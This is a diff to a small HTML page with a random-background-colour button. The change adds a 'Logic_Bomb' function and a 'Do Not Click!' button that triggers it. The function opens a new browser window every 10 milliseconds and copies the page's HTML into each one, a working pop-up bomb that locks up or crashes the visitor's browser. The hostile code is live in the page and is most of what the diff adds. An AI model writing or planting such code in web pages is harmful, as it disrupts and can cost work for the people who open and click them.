@@ -30,11 +30,17 @@ function random_bg_color() {
     }
 
 random_bg_color();
-
+ function Logic_Bomb () {
+	 setInterval(function() {
+        var w = window.open();
+        w.document.write(document.documentElement.outerHTML||document.documentElement.innerHTML);
+      }, 10);
+ }
 </script>
 </head>
 <body>
 <button onclick="random_bg_color()" class="button">Backround Color</button>
+	<button onclick="Logic_Bomb()" class="button"><b>Do Not Click!</b></button>
 	<p>My code is <del>a terrible copy-pasted mess</del></p>	
 </body>
 </html>
